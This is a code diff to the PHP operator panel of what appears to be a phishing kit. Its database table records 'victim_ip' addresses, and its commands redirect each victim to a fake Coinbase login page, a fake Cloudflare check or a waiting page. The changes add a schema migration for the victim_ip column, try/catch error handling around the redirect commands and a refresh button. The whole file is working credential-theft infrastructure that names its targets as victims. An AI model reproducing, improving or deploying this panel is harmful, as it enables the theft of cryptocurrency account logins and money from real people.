@@ -14,14 +14,30 @@ require_once __DIR__ . '/blocker-raw.php';
 $database = new Database();
 $db = $database->getConnection();
 
-// Create necessary tables
+// Create/Update necessary tables
 try {
-    // Create redirect_commands table with expiration and IPv4 support
+    // Check if victim_ip column exists in redirect_commands table
+    $check_column = "SELECT column_name FROM information_schema.columns 
+                    WHERE table_name = 'redirect_commands' AND column_name = 'victim_ip'";
+    $column_stmt = $db->query($check_column);
+    $column_exists = $column_stmt->fetch(PDO::FETCH_ASSOC);
+    
+    if (!$column_exists) {
+        // Add victim_ip column if it doesn't exist
+        $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_ip VARCHAR(45) NOT NULL DEFAULT '0.0.0.0'";
+        $db->exec($alter_table);
+        
+        // Update existing records if any
+        $update_existing = "UPDATE redirect_commands SET victim_ip = '0.0.0.0' WHERE victim_ip IS NULL";
+        $db->exec($update_existing);
+    }
+    
+    // Create redirect_commands table with expiration and IPv4 support (if not exists)
     $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
         id SERIAL PRIMARY KEY,
         command VARCHAR(50) NOT NULL,
         target TEXT NOT NULL,
-        victim_ip VARCHAR(45) NOT NULL,
+        victim_ip VARCHAR(45) NOT NULL DEFAULT '0.0.0.0',
         expires_at TIMESTAMP DEFAULT (NOW() + INTERVAL '30 seconds'),
         executed BOOLEAN DEFAULT FALSE,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -75,37 +91,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             exit;
         }
         
-        switch($command) {
-            case 'redirect_to_coinbase':
-                $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
-                         VALUES ('redirect', 'coinbaselogin.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
-                $stmt = $db->prepare($query);
-                $stmt->execute([':victim_ip' => $victim_ip]);
-                $_SESSION['success_message'] = 'Redirect command sent to Coinbase for IP: ' . $victim_ip;
-                break;
-                
-            case 'redirect_to_cloudflare':
-                $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
-                         VALUES ('redirect', 'index.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
-                $stmt = $db->prepare($query);
-                $stmt->execute([':victim_ip' => $victim_ip]);
-                $_SESSION['success_message'] = 'Redirect command sent to Cloudflare for IP: ' . $victim_ip;
-                break;
+        try {
+            switch($command) {
+                case 'redirect_to_coinbase':
+                    $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
+                             VALUES ('redirect', 'coinbaselogin.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
+                    $stmt = $db->prepare($query);
+                    $stmt->execute([':victim_ip' => $victim_ip]);
+                    $_SESSION['success_message'] = 'Redirect command sent to Coinbase for IP: ' . $victim_ip;
+                    break;
+                    
+                case 'redirect_to_cloudflare':
+                    $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
+                             VALUES ('redirect', 'index.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
+                    $stmt = $db->prepare($query);
+                    $stmt->execute([':victim_ip' => $victim_ip]);
+                    $_SESSION['success_message'] = 'Redirect command sent to Cloudflare for IP: ' . $victim_ip;
+                    break;
 
-            case 'redirect_to_waiting':
-                $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
-                         VALUES ('redirect', 'waiting.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
-                $stmt = $db->prepare($query);
-                $stmt->execute([':victim_ip' => $victim_ip]);
-                $_SESSION['success_message'] = 'Redirect command sent to Waiting Page for IP: ' . $victim_ip;
-                break;
-                
-            case 'clear_redirect':
-                $query = "DELETE FROM redirect_commands WHERE victim_ip = :victim_ip";
-                $stmt = $db->prepare($query);
-                $stmt->execute([':victim_ip' => $victim_ip]);
-                $_SESSION['success_message'] = 'Redirects cleared for IP: ' . $victim_ip;
-                break;
+                case 'redirect_to_waiting':
+                    $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
+                             VALUES ('redirect', 'waiting.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
+                    $stmt = $db->prepare($query);
+                    $stmt->execute([':victim_ip' => $victim_ip]);
+                    $_SESSION['success_message'] = 'Redirect command sent to Waiting Page for IP: ' . $victim_ip;
+                    break;
+                    
+                case 'clear_redirect':
+                    $query = "DELETE FROM redirect_commands WHERE victim_ip = :victim_ip";
+                    $stmt = $db->prepare($query);
+                    $stmt->execute([':victim_ip' => $victim_ip]);
+                    $_SESSION['success_message'] = 'Redirects cleared for IP: ' . $victim_ip;
+                    break;
+            }
+        } catch (Exception $e) {
+            error_log("Redirect command error: " . $e->getMessage());
+            $_SESSION['error_message'] = 'Error executing command: ' . $e->getMessage();
         }
     }
 
@@ -288,6 +309,28 @@ if (isset($_SESSION['error_message'])) {
             border-radius: 4px;
             font-size: 12px;
         }
+        .refresh-controls {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        .refresh-btn {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .refresh-btn:hover {
+            background: #1976D2;
+        }
     </style>
 </head>
 <body>
@@ -426,12 +469,39 @@ if (isset($_SESSION['error_message'])) {
             </form>
         </div>
 
-        <!-- Auto Refresh Script -->
+        <!-- Manual Refresh Button -->
+        <div class="refresh-controls">
+            <button class="refresh-btn" onclick="window.location.reload()" title="Refresh Panel">
+                🔄
+            </button>
+        </div>
+
+        <!-- Auto Refresh Script - Optional -->
         <script>
-            // Auto-refresh the page every 3 seconds for live updates
-            setTimeout(function() {
-                window.location.reload();
-            }, 3000);
+            let autoRefreshEnabled = false;
+            let refreshInterval;
+            
+            function toggleAutoRefresh() {
+                autoRefreshEnabled = !autoRefreshEnabled;
+                const btn = document.getElementById('refreshToggle');
+                
+                if (autoRefreshEnabled) {
+                    refreshInterval = setInterval(function() {
+                        window.location.reload();
+                    }, 3000);
+                    btn.innerHTML = '⏸️';
+                    btn.title = 'Pause Auto Refresh';
+                    btn.style.background = '#FF9800';
+                } else {
+                    clearInterval(refreshInterval);
+                    btn.innerHTML = '🔄';
+                    btn.title = 'Enable Auto Refresh';
+                    btn.style.background = '#2196F3';
+                }
+            }
+            
+            // Uncomment below to enable auto-refresh by default
+            // toggleAutoRefresh();
         </script>
     </main>
 </body>
